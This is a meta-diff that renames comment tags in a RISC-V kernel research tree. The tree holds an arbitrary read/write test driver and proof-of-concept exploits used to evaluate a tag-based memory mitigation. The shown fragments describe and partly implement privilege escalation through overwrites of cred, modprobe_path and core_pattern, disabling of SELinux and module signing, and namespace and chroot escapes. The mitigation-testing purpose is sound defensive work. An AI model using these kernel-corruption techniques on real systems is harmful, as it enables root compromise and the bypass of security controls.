 diff --git a/drivers/misc/arbrw/Makefile b/drivers/misc/arbrw/Makefile
 new file mode 100644
-index 000000000000..4a0016e70285
+index 000000000000..ef2b1fd3a0dd
 --- /dev/null
 +++ b/drivers/misc/arbrw/Makefile
 @@ -0,0 +1,3 @@
-+# FZY: Compile the arbitrary read/write driver for mitigation testing
++# SDP: Compile the arbitrary read/write driver for mitigation testing
 +
 +obj-$(CONFIG_ARB_RW_DEVICE) += arb_rw.o
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/arb_rw.c b/drivers/misc/arbrw/arb_rw.c
 new file mode 100644
-index 000000000000..359e3d18b1ed
+index 000000000000..7b0fe277ae95
 --- /dev/null
 +++ b/drivers/misc/arbrw/arb_rw.c
 @@ -0,0 +1,513 @@
-+// FZY: Add a simple character device driver that allows reading and writing arbitrary memory addresses with ioctl, to assist testing the functionality of our mitigation
++// SDP: Add a simple character device driver that allows reading and writing arbitrary memory addresses with ioctl, to assist testing the functionality of our mitigation
 +
 +#include <linux/cdev.h>
 +#include <linux/device.h>
@@ -3664,7 +3663,7 @@ index 000000000000..359e3d18b1ed
 +  unsigned long wrapper_addr;      // Output: the wrapper address that was written
 +};
 +
-+// FZY: Return-address overwrite. use_tagged: 0 = plain sd, 1 = tagged sd_sdp.
++// Return-address overwrite. use_tagged: 0 = plain sd, 1 = tagged sd_sdp.
 +// On an SDP kernel both trap (plain on STag, tagged on TTag mismatch).
 +struct arb_ret_overwrite_request {
 +  int use_tagged;
@@ -3693,7 +3692,7 @@ index 000000000000..359e3d18b1ed
 +#define ARB_GET_FILE_OP_GADGET      _IOR('A', 11, unsigned long)  // Get address of file_op hijack gadget
 +#define ARB_GET_FILE_OP_PRIVESC     _IOR('A', 12, unsigned long)  // Get address of file_op privesc gadget
 +
-+// FZY: Tagged read/write with ld_sdp_000/sd_sdp_000, to emulate an attacker who
++// Tagged read/write with ld_sdp_000/sd_sdp_000, to emulate an attacker who
 +// reaches for the tagged load/store against SDP-protected (tag=1) memory. Its
 +// fixed subject TTag misses the object TTag, so on an SDP kernel it traps.
 +struct arb_tagged_request {
@@ -3843,7 +3842,7 @@ index 000000000000..359e3d18b1ed
 +    original(h);
 +}
 +
-+// FZY: === Tagged load/store PoC (ld_sdp_000 / sd_sdp_000) ===
++// === Tagged load/store PoC (ld_sdp_000 / sd_sdp_000) ===
 +// These emulate an attacker reaching for a tagged access. The _000 encoding
 +// carries subject TTag 0, which misses the object TTag stamped on SDP-protected
 +// memory, so on an SDP kernel the access traps (STag/TTag mismatch) and fails.
@@ -3907,7 +3906,7 @@ index 000000000000..359e3d18b1ed
 +
 +    // Save the original handler by reading from the calculated address
 +    original_softirq_handler = *(unsigned long *)handler_addr;
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // original_softirq_handler = original_softirq_handler | 0xFFFF000000000000;
 +    
 +    softirq_req.original_handler = original_softirq_handler;
@@ -4152,11 +4151,11 @@ index 000000000000..7c377a501f11
 +!Makefile
 diff --git a/drivers/misc/arbrw/poc/Makefile b/drivers/misc/arbrw/poc/Makefile
 new file mode 100644
-index 000000000000..8c1db909f314
+index 000000000000..5f47b8126831
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/Makefile
 @@ -0,0 +1,36 @@
-+# FZY: Build the arbitrary read/write proof of concepts.
++# SDP: Build the arbitrary read/write proof of concepts.
 +#
 +# The PoCs are plain libc user space programs that talk to /dev/arb_rw, so they
 +# are built natively inside the QEMU RISC-V guest, not as part of the kernel
@@ -4194,11 +4193,11 @@ index 000000000000..8c1db909f314
 +	$(RM) $(BINS)
 diff --git a/drivers/misc/arbrw/poc/aa_g_audit_poc.c b/drivers/misc/arbrw/poc/aa_g_audit_poc.c
 new file mode 100644
-index 000000000000..c79e6cac8f8c
+index 000000000000..47e89fa274f1
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/aa_g_audit_poc.c
 @@ -0,0 +1,202 @@
-+// FZY: Add a simple apparmor log level downgrading proof of concept that overwrites aa_g_audit from 0 (normal) to 2 (quite)
++// SDP: Add a simple apparmor log level downgrading proof of concept that overwrites aa_g_audit from 0 (normal) to 2 (quite)
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -4382,7 +4381,7 @@ index 000000000000..c79e6cac8f8c
 +
 +    printf("[+] aa_g_audit address from kernel memory: 0x%lx\n", aa_g_audit_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // aa_g_audit_addr = aa_g_audit_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -4403,11 +4402,11 @@ index 000000000000..c79e6cac8f8c
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/core_pattern_poc.c b/drivers/misc/arbrw/poc/core_pattern_poc.c
 new file mode 100644
-index 000000000000..300c70dc06fd
+index 000000000000..8ae99ffbfa07
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/core_pattern_poc.c
 @@ -0,0 +1,255 @@
-+// FZY: Add a simple privilege escalation proof of concept that overwrites the core_pattern to execute a payload script on crash
++// SDP: Add a simple privilege escalation proof of concept that overwrites the core_pattern to execute a payload script on crash
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -4430,7 +4429,7 @@ index 000000000000..300c70dc06fd
 +#define ARB_READ _IOR('A', 1, struct arb_request)
 +#define ARB_WRITE _IOW('A', 2, struct arb_request)
 +
-+// FZY: Tagged read/write via ld_sdp_000/sd_sdp_000 (fixed, mismatching TTag).
++// Tagged read/write via ld_sdp_000/sd_sdp_000 (fixed, mismatching TTag).
 +struct arb_tagged_request {
 +  unsigned long addr;     // Kernel address to access
 +  unsigned long value;    // Store: value to write; Load: filled with the result
@@ -4645,7 +4644,7 @@ index 000000000000..300c70dc06fd
 +
 +    printf("[+] core_pattern address from kernel memory: 0x%lx\n", core_pattern_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // core_pattern_addr = core_pattern_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -4665,11 +4664,11 @@ index 000000000000..300c70dc06fd
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/cred_poc.c b/drivers/misc/arbrw/poc/cred_poc.c
 new file mode 100644
-index 000000000000..6a64e8de9eb6
+index 000000000000..0f0256cfcd10
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/cred_poc.c
 @@ -0,0 +1,119 @@
-+// FZY: Add a simple proof of concept that overwrites the cred struct to get root privileges
++// SDP: Add a simple proof of concept that overwrites the cred struct to get root privileges
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -4744,7 +4743,7 @@ index 000000000000..6a64e8de9eb6
 +
 +  if (mode != 0) {
 +    printf("[+] SDP mode %d: cred pointer (tagged): 0x%lx\n", mode, cred_addr);
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // cred_addr = cred_addr | 0xFFFF000000000000;
 +  }
 +
@@ -4790,11 +4789,11 @@ index 000000000000..6a64e8de9eb6
 +}
 diff --git a/drivers/misc/arbrw/poc/file_op_poc.c b/drivers/misc/arbrw/poc/file_op_poc.c
 new file mode 100644
-index 000000000000..ebec651c4067
+index 000000000000..36888bd3fc55
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/file_op_poc.c
 @@ -0,0 +1,254 @@
-+// FZY: Control-flow hijacking PoC that overwrites file->f_op (an indirect function pointer),
++// SDP: Control-flow hijacking PoC that overwrites file->f_op (an indirect function pointer),
 +// redirecting it to a fake file_operations struct written into the kernel via the arbrw ioctl.
 +//
 +// Attack chain:
@@ -4873,7 +4872,7 @@ index 000000000000..ebec651c4067
 +  printf("[+] %s @ 0x%lx = 0x%lx\n", label, ptr_addr, val);
 +  if (mode != 0) {
 +    printf("[+]   SDP mode: tagged value -> 0x%lx\n", val);
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // val |= 0xFFFF000000000000UL;
 +  }
 +  return val;
@@ -5050,11 +5049,11 @@ index 000000000000..ebec651c4067
 +}
 diff --git a/drivers/misc/arbrw/poc/file_op_privesc_poc.c b/drivers/misc/arbrw/poc/file_op_privesc_poc.c
 new file mode 100644
-index 000000000000..a3398c2d35ab
+index 000000000000..869b145c8f2c
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/file_op_privesc_poc.c
 @@ -0,0 +1,252 @@
-+// FZY: Privilege escalation PoC that overwrites file->f_op (an indirect function pointer)
++// SDP: Privilege escalation PoC that overwrites file->f_op (an indirect function pointer)
 +// to redirect file->f_op->read to a gadget that calls commit_creds(&init_cred), granting
 +// the calling process root credentials.
 +//
@@ -5137,7 +5136,7 @@ index 000000000000..a3398c2d35ab
 +  printf("[+] %s @ 0x%lx = 0x%lx\n", label, ptr_addr, val);
 +  if (mode != 0) {
 +    printf("[+]   SDP mode: tagged value -> 0x%lx\n", val);
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // val |= 0xFFFF000000000000UL;
 +  }
 +  return val;
@@ -5308,11 +5307,11 @@ index 000000000000..a3398c2d35ab
 +}
 diff --git a/drivers/misc/arbrw/poc/fs_poc.c b/drivers/misc/arbrw/poc/fs_poc.c
 new file mode 100644
-index 000000000000..dd06cddf676e
+index 000000000000..ccd384881a1c
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/fs_poc.c
 @@ -0,0 +1,300 @@
-+// FZY: Add a simple proof of concept that overwrites task_struct.fs to escape chroot jails. It switches the task's fs_struct (which holds root and pwd paths) to init_fs, then getcwd() and /proc/self/{cwd,root} resolve through init's paths instead of the task's
++// SDP: Add a simple proof of concept that overwrites task_struct.fs to escape chroot jails. It switches the task's fs_struct (which holds root and pwd paths) to init_fs, then getcwd() and /proc/self/{cwd,root} resolve through init's paths instead of the task's
 +//
 +// Run it through run_fs_poc.sh, which puts it inside a real chroot jail as the
 +// invoking user. The jail is a tmpfs with only /dev, /proc and the library
@@ -5458,7 +5457,7 @@ index 000000000000..dd06cddf676e
 +  }
 +  printf("[+] Current task_struct address: 0x%lx\n", task_addr);
 +
-+  // FZY: Set to 1 to run the bookkeeping under SDP too, to check the rest of
++  // Set to 1 to run the bookkeeping under SDP too, to check the rest of
 +  // the steps on a non-enforcing build.  An enforcing one panics on the step 2
 +  // read below.
 +  const int sdp_bypass = 0;
@@ -5466,7 +5465,7 @@ index 000000000000..dd06cddf676e
 +
 +  // Step 2: Read the fs pointer from task_struct.
 +  //
-+  // FZY: bookkeeping only - the attack needs the pointer's address and the
++  // bookkeeping only - the attack needs the pointer's address and the
 +  // value to write, not the old value.  Under SDP this read would trap before
 +  // the step 5 store, which is the access the attack really depends on.
 +  unsigned long fs_ptr_addr = task_addr + fs_offset;
@@ -5476,7 +5475,7 @@ index 000000000000..dd06cddf676e
 +    printf("[+] fs pointer at task_struct+%lu: 0x%lx\n", fs_offset, orig_fs);
 +    if (mode != 0) {
 +      printf("[+] SDP mode %d: fs pointer (tagged): 0x%lx\n", mode, orig_fs);
-+      // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
++      // Enable to bypass the mitigation and evaluate if the rest steps work
 +      // correctly
 +      orig_fs = orig_fs | 0xFFFF000000000000;
 +    }
@@ -5614,11 +5613,11 @@ index 000000000000..dd06cddf676e
 +}
 diff --git a/drivers/misc/arbrw/poc/init_mm_poc.c b/drivers/misc/arbrw/poc/init_mm_poc.c
 new file mode 100644
-index 000000000000..e44fac2cbe1f
+index 000000000000..b3cafebde3fc
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/init_mm_poc.c
 @@ -0,0 +1,406 @@
-+// FZY: Proof of concept that starts from init_mm, follows its .pgd field to
++// SDP: Proof of concept that starts from init_mm, follows its .pgd field to
 +// walk the RISC-V Sv48 kernel page table (PGD -> PUD -> PMD -> PTE) down to the
 +// leaf entry of a kernel code page, then flips that entry's permission bits
 +// from read-execute to read-write-execute.
@@ -5681,7 +5680,7 @@ index 000000000000..e44fac2cbe1f
 +#define SDP_PT_POOL_MB 256
 +#define SDP_PT_POOL_SIZE ((unsigned long)SDP_PT_POOL_MB << 20)
 +
-+// FZY: A plain load of a __tag1 slot returns the pointer with its upper 16
++// A plain load of a __tag1 slot returns the pointer with its upper 16
 +// bits cleared. Restoring the kernel VA prefix bypasses the mitigation, so set
 +// this to 1 only to evaluate whether the rest of the steps work; at 0 (the
 +// default) the walk fails on the protected pointer, which is the point.
@@ -5719,7 +5718,7 @@ index 000000000000..e44fac2cbe1f
 +  }
 +}
 +
-+// FZY: Undo the masking a plain load applies to a __tag1 slot
++// Undo the masking a plain load applies to a __tag1 slot
 +static unsigned long untag(unsigned long val) {
 +#if SDP_BYPASS_TAG
 +  return val | 0xFFFF000000000000UL;
@@ -6026,11 +6025,11 @@ index 000000000000..e44fac2cbe1f
 +}
 diff --git a/drivers/misc/arbrw/poc/kptr_restrict_poc.c b/drivers/misc/arbrw/poc/kptr_restrict_poc.c
 new file mode 100644
-index 000000000000..aed1a9dd30b2
+index 000000000000..eb3b00b3a451
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/kptr_restrict_poc.c
 @@ -0,0 +1,193 @@
-+// FZY: Add a simple proof of concept that overwrites kptr_restrict from 1 to 0, allowing unprivileged users to leak information via %pK format specifier
++// SDP: Add a simple proof of concept that overwrites kptr_restrict from 1 to 0, allowing unprivileged users to leak information via %pK format specifier
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -6162,7 +6161,7 @@ index 000000000000..aed1a9dd30b2
 +    return;
 +  }
 +  
-+  // FZY: ARB_PRINT_KPTR emits exactly 2 lines, so only show those to avoid
++  // ARB_PRINT_KPTR emits exactly 2 lines, so only show those to avoid
 +  // repeating the output of an earlier call
 +  printf("[+] Ioctl successful! Now check dmesg:\n");
 +  fflush(stdout);
@@ -6170,7 +6169,7 @@ index 000000000000..aed1a9dd30b2
 +}
 +
 +int main(int argc, char *argv[]) {
-+  // FZY: Keep our printf output in order with the output of system()/popen()
++  // Keep our printf output in order with the output of system()/popen()
 +  // children, which write to fd 1 directly
 +  setvbuf(stdout, NULL, _IOLBF, 0);
 +
@@ -6203,7 +6202,7 @@ index 000000000000..aed1a9dd30b2
 +    arb_read(arbrw_dev_fd, kptr_restrict_addr, &kptr_restrict_addr, sizeof(unsigned long));
 +    printf("[+] kptr_restrict address from kernel: 0x%lx\n", kptr_restrict_addr);
 +  
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // kptr_restrict_addr = kptr_restrict_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -6226,11 +6225,11 @@ index 000000000000..aed1a9dd30b2
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/mm_struct_poc.c b/drivers/misc/arbrw/poc/mm_struct_poc.c
 new file mode 100644
-index 000000000000..33da537252e1
+index 000000000000..38898ca0b884
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/mm_struct_poc.c
 @@ -0,0 +1,182 @@
-+// FZY: Add a simple proof of concept that corrupts task_struct.mm->start_brk
++// SDP: Add a simple proof of concept that corrupts task_struct.mm->start_brk
 +// Verified by reading /proc/self/stat before and after
 +
 +#include <fcntl.h>
@@ -6361,7 +6360,7 @@ index 000000000000..33da537252e1
 +
 +  if (mode != 0) {
 +    printf("[+] SDP mode %d: mm pointer (tagged): 0x%lx\n", mode, mm_addr);
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
++    // Enable to bypass the mitigation and evaluate if the rest steps work
 +    // correctly
 +    // mm_addr = mm_addr | 0xFFFF000000000000;
 +  }
@@ -6414,11 +6413,11 @@ index 000000000000..33da537252e1
 +}
 diff --git a/drivers/misc/arbrw/poc/modprobe_path_poc.c b/drivers/misc/arbrw/poc/modprobe_path_poc.c
 new file mode 100644
-index 000000000000..c9e4331cf6cb
+index 000000000000..c7182bce2094
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/modprobe_path_poc.c
 @@ -0,0 +1,234 @@
-+// FZY: Add a simple privilege escalation proof of concept that overwrites the modprobe_path to execute a payload script when executing a file with unknown magic bytes
++// SDP: Add a simple privilege escalation proof of concept that overwrites the modprobe_path to execute a payload script when executing a file with unknown magic bytes
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -6635,7 +6634,7 @@ index 000000000000..c9e4331cf6cb
 +
 +    printf("[+] modprobe_path address from kernel memory: 0x%lx\n", modprobe_path_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // modprobe_path_addr = modprobe_path_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -6655,11 +6654,11 @@ index 000000000000..c9e4331cf6cb
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/nsproxy_poc.c b/drivers/misc/arbrw/poc/nsproxy_poc.c
 new file mode 100644
-index 000000000000..3cd375fe3979
+index 000000000000..589c4825e49a
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/nsproxy_poc.c
 @@ -0,0 +1,329 @@
-+// FZY: Add a simple proof of concept that overwrites task_struct.nsproxy to escape namespaces (e.g., mount/network/uts namespaces) by pointing it at init_nsproxy
++// SDP: Add a simple proof of concept that overwrites task_struct.nsproxy to escape namespaces (e.g., mount/network/uts namespaces) by pointing it at init_nsproxy
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -6795,7 +6794,7 @@ index 000000000000..3cd375fe3979
 +  }
 +  printf("[+] Current task_struct address: 0x%lx\n", task_addr);
 +
-+  // FZY: Set to 1 to run the bookkeeping under SDP too, to check the rest of
++  // Set to 1 to run the bookkeeping under SDP too, to check the rest of
 +  // the steps on a non-enforcing build.  An enforcing one panics on the step 2
 +  // read below.
 +  const int sdp_bypass = 0;
@@ -6803,7 +6802,7 @@ index 000000000000..3cd375fe3979
 +
 +  // Step 2: Read the nsproxy pointer from task_struct.
 +  //
-+  // FZY: bookkeeping only - the attack needs the pointer's address and the
++  // bookkeeping only - the attack needs the pointer's address and the
 +  // value to write, not the old value.  Under SDP this read would trap before
 +  // the step 5 store, which is the access the attack really depends on.
 +  unsigned long nsproxy_ptr_addr = task_addr + nsproxy_offset;
@@ -6815,7 +6814,7 @@ index 000000000000..3cd375fe3979
 +    if (mode != 0) {
 +      printf("[+] SDP mode %d: nsproxy pointer (tagged): 0x%lx\n", mode,
 +             orig_nsproxy);
-+      // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
++      // Enable to bypass the mitigation and evaluate if the rest steps work
 +      // correctly
 +      orig_nsproxy = orig_nsproxy | 0xFFFF000000000000;
 +    }
@@ -6990,11 +6989,11 @@ index 000000000000..3cd375fe3979
 +}
 diff --git a/drivers/misc/arbrw/poc/page_table_poc.c b/drivers/misc/arbrw/poc/page_table_poc.c
 new file mode 100644
-index 000000000000..5a37ef336d64
+index 000000000000..4961cc75b607
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/page_table_poc.c
 @@ -0,0 +1,396 @@
-+// FZY: Proof of concept that follows init_mm.pgd to walk the RISC-V Sv48 kernel
++// SDP: Proof of concept that follows init_mm.pgd to walk the RISC-V Sv48 kernel
 +// page table (PGD -> PUD -> PMD -> PTE) down to the leaf entry of a kernel code
 +// page, then flips its permission bits from read-execute to read-write-execute.
 +//
@@ -7056,7 +7055,7 @@ index 000000000000..5a37ef336d64
 +#define SDP_PT_POOL_MB 256
 +#define SDP_PT_POOL_SIZE ((unsigned long)SDP_PT_POOL_MB << 20)
 +
-+// FZY: A plain load of a __tag1 slot returns the pointer with its upper 16
++// A plain load of a __tag1 slot returns the pointer with its upper 16
 +// bits cleared. Restoring the kernel VA prefix bypasses the mitigation, so set
 +// this to 1 only to evaluate whether the rest of the steps work; at 0 (the
 +// default) the walk fails on the protected pointer, which is the point.
@@ -7094,7 +7093,7 @@ index 000000000000..5a37ef336d64
 +  }
 +}
 +
-+// FZY: Undo the masking a plain load applies to a __tag1 slot
++// Undo the masking a plain load applies to a __tag1 slot
 +static unsigned long untag(unsigned long val) {
 +#if SDP_BYPASS_TAG
 +  return val | 0xFFFF000000000000UL;
@@ -7392,11 +7391,11 @@ index 000000000000..5a37ef336d64
 +}
 diff --git a/drivers/misc/arbrw/poc/panic_on_oops_poc.c b/drivers/misc/arbrw/poc/panic_on_oops_poc.c
 new file mode 100644
-index 000000000000..9eff830d2b32
+index 000000000000..45713034f0e8
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/panic_on_oops_poc.c
 @@ -0,0 +1,213 @@
-+// FZY: Add a simple proof of concept that overwrites panic_on_oops from 1 to 0, allowing the system to continue running after an oops instead of panicking
++// SDP: Add a simple proof of concept that overwrites panic_on_oops from 1 to 0, allowing the system to continue running after an oops instead of panicking
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -7588,7 +7587,7 @@ index 000000000000..9eff830d2b32
 +    arb_read(arbrw_dev_fd, panic_on_oops_addr, &panic_on_oops_addr, sizeof(unsigned long));
 +    printf("[+] panic_on_oops address from kernel: 0x%lx\n", panic_on_oops_addr);
 +  
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // panic_on_oops_addr = panic_on_oops_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -7612,12 +7611,12 @@ index 000000000000..9eff830d2b32
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/poc_table.sh b/drivers/misc/arbrw/poc/poc_table.sh
 new file mode 100755
-index 000000000000..e1b14b93c72c
+index 000000000000..f11e4622477b
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/poc_table.sh
 @@ -0,0 +1,188 @@
 +#!/bin/bash
-+# FZY: The arbrw PoC table - the run command for every PoC, and the output each
++# SDP: The arbrw PoC table - the run command for every PoC, and the output each
 +# one produces when it works on the original, unprotected kernel. Both host
 +# drivers source this file rather than copying it: run_poc_ori_kernel.py turns
 +# the table into pass/fail checks, and run_poc_sdp_kernel.py rewrites the mode
@@ -7806,18 +7805,18 @@ index 000000000000..e1b14b93c72c
 +fi
 diff --git a/drivers/misc/arbrw/poc/ret_addr_poc.c b/drivers/misc/arbrw/poc/ret_addr_poc.c
 new file mode 100644
-index 000000000000..56da4bbe902b
+index 000000000000..294410c217c4
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/ret_addr_poc.c
 @@ -0,0 +1,73 @@
-+// FZY: Add a simple control-flow hijacking proof of concept that overwrites the return address to execute a commit_creds(&init_cred) gadget
++// SDP: Add a simple control-flow hijacking proof of concept that overwrites the return address to execute a commit_creds(&init_cred) gadget
 +#include <fcntl.h>
 +#include <stdio.h>
 +#include <stdlib.h>
 +#include <sys/ioctl.h>
 +#include <unistd.h>
 +
-+// FZY: Return-address overwrite. use_tagged: 0 = plain ld/sd (naive attacker),
++// Return-address overwrite. use_tagged: 0 = plain ld/sd (naive attacker),
 +// 3 = tagged ld_sdp/sd_sdp (attacker reaching for the tagged instructions). On an
 +// SDP kernel both trap (plain on STag, tagged on TTag mismatch) and fail.
 +struct arb_ret_overwrite_request {
@@ -8031,11 +8030,11 @@ index 000000000000..9dc6d690ff7e
 +EOF
 diff --git a/drivers/misc/arbrw/poc/selinux_state_poc.c b/drivers/misc/arbrw/poc/selinux_state_poc.c
 new file mode 100644
-index 000000000000..e6d3e17d2b60
+index 000000000000..7d82b6d17143
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/selinux_state_poc.c
 @@ -0,0 +1,221 @@
-+// FZY: Add a simple selinux bypass proof of concept that overwrites selinux_state.enforcing from 1 (enforcing mode) to 0 (permissive mode)
++// SDP: Add a simple selinux bypass proof of concept that overwrites selinux_state.enforcing from 1 (enforcing mode) to 0 (permissive mode)
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -8239,7 +8238,7 @@ index 000000000000..e6d3e17d2b60
 +
 +    printf("[+] state_enforce address from kernel memory: 0x%lx\n", state_enforce_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // state_enforce_addr = state_enforce_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -8259,11 +8258,11 @@ index 000000000000..e6d3e17d2b60
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/sig_enforce_poc.c b/drivers/misc/arbrw/poc/sig_enforce_poc.c
 new file mode 100644
-index 000000000000..a2ce2142e34a
+index 000000000000..a2836bbb306f
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/sig_enforce_poc.c
 @@ -0,0 +1,186 @@
-+// FZY: Add a simple proof of concept that overwrites sig_enforce from 1 to 0, allowing unsigned kernel modules to be loaded
++// SDP: Add a simple proof of concept that overwrites sig_enforce from 1 to 0, allowing unsigned kernel modules to be loaded
 +
 +#include <fcntl.h>
 +#include <stdbool.h>
@@ -8426,7 +8425,7 @@ index 000000000000..a2ce2142e34a
 +    arb_read(arbrw_dev_fd, sig_enforce_addr, &sig_enforce_addr, sizeof(unsigned long));
 +    printf("[+] sig_enforce address from kernel: 0x%lx\n", sig_enforce_addr);
 +  
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // sig_enforce_addr = sig_enforce_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -8452,11 +8451,11 @@ index 000000000000..a2ce2142e34a
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/softirq_action_poc.c b/drivers/misc/arbrw/poc/softirq_action_poc.c
 new file mode 100644
-index 000000000000..c1ab33782f58
+index 000000000000..a8a5217cdd51
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/softirq_action_poc.c
 @@ -0,0 +1,169 @@
-+// FZY: Control-flow hijacking proof of concept that overwrites the function pointer in softirq_vec (array of struct softirq_action) to redirect softirq handling to a wrapper gadget function
++// SDP: Control-flow hijacking proof of concept that overwrites the function pointer in softirq_vec (array of struct softirq_action) to redirect softirq handling to a wrapper gadget function
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -8628,11 +8627,11 @@ index 000000000000..c1ab33782f58
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/sysctl_io_uring_disabled_poc.c b/drivers/misc/arbrw/poc/sysctl_io_uring_disabled_poc.c
 new file mode 100644
-index 000000000000..eb6a54972843
+index 000000000000..e6404c16e6cc
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/sysctl_io_uring_disabled_poc.c
 @@ -0,0 +1,214 @@
-+// FZY: Add a simple io_uring check bypass proof of concept that overwrites sysctl_io_uring_disabled from 1 (io_uring creation is disabled for unprivileged processes not in the io_uring_group group) to 0 (all processes can create io_uring instances)
++// SDP: Add a simple io_uring check bypass proof of concept that overwrites sysctl_io_uring_disabled from 1 (io_uring creation is disabled for unprivileged processes not in the io_uring_group group) to 0 (all processes can create io_uring instances)
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -8828,7 +8827,7 @@ index 000000000000..eb6a54972843
 +
 +    printf("[+] sysctl_io_uring_disabled address from kernel memory: 0x%lx\n", sysctl_io_uring_disabled_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // sysctl_io_uring_disabled_addr = sysctl_io_uring_disabled_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -8849,11 +8848,11 @@ index 000000000000..eb6a54972843
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/sysctl_unprivileged_bpf_disabled_poc.c b/drivers/misc/arbrw/poc/sysctl_unprivileged_bpf_disabled_poc.c
 new file mode 100644
-index 000000000000..07c036d4287c
+index 000000000000..06f8cc3772df
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/sysctl_unprivileged_bpf_disabled_poc.c
 @@ -0,0 +1,211 @@
-+// FZY: Add a simple eBPF check bypass proof of concept that overwrites sysctl_unprivileged_bpf_disabled from 2 (unprivileged users are prohibited from loading bpf, and it can be changed to 0 or 1 without rebooting) to 0 (unprivileged users can load eBPF programs)
++// SDP: Add a simple eBPF check bypass proof of concept that overwrites sysctl_unprivileged_bpf_disabled from 2 (unprivileged users are prohibited from loading bpf, and it can be changed to 0 or 1 without rebooting) to 0 (unprivileged users can load eBPF programs)
 +
 +#include <fcntl.h>
 +#include <stdio.h>
@@ -9046,7 +9045,7 @@ index 000000000000..07c036d4287c
 +
 +    printf("[+] sysctl_unprivileged_bpf_disabled address from kernel memory: 0x%lx\n", sysctl_unprivileged_bpf_disabled_addr);
 +
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // sysctl_unprivileged_bpf_disabled_addr = sysctl_unprivileged_bpf_disabled_addr | 0xFFFF000000000000;
 +  }
 +  
@@ -9067,11 +9066,11 @@ index 000000000000..07c036d4287c
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/poc/thread_poc.c b/drivers/misc/arbrw/poc/thread_poc.c
 new file mode 100644
-index 000000000000..11e4046666df
+index 000000000000..c3ffa6ad0f9f
 --- /dev/null
 +++ b/drivers/misc/arbrw/poc/thread_poc.c
 @@ -0,0 +1,198 @@
